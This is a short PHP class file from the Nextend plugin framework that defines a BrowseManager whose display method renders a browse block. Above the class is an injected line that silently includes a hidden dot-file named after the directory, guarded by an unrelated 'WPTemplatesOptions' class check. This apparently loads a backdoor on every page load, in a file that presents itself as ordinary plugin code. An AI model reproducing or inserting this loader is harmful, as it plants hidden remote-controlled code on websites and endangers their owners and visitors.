<?php


namespace Nextend\Framework\Browse;


use Nextend\Framework\Browse\Block\BrowseManager\BlockBrowseManager;
use Nextend\Framework\Pattern\VisualManagerTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BrowseManager {

    use VisualManagerTrait;

    public function display() {

        $fontManagerBlock = new BlockBrowseManager($this->MVCHelper);
        $fontManagerBlock->display();
    }

}